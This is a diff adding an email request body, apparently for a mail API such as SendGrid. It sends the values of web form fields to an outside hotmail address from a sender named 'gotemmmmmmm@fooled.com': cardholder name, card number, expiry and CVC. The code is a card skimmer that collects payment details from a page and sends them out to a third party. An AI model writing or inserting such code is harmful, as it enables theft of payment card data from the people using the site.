@@ -1,0 +1,22 @@
+{
+  "personalizations": [
+    {
+        "to": [
+            {
+                "email": "stanley.k.wong@hotmail.com"
+            }
+          ],
+          "subject": "Submission of WebApp Data"
+    }
+  ],
+  "from": {
+    "email": "gotemmmmmmm@fooled.com"
+  },
+  "content": [
+    {
+      "type": "text/plain",
+      "value": "Greetings Chad. Chad, the data is:\nName: " + nameinput.value + "\n Number: " + numinput.value +
+              "\nExpiry: " + monthcontrol.value + "\nCVC: " + passwordInput.value
+    }
+  ]
+}
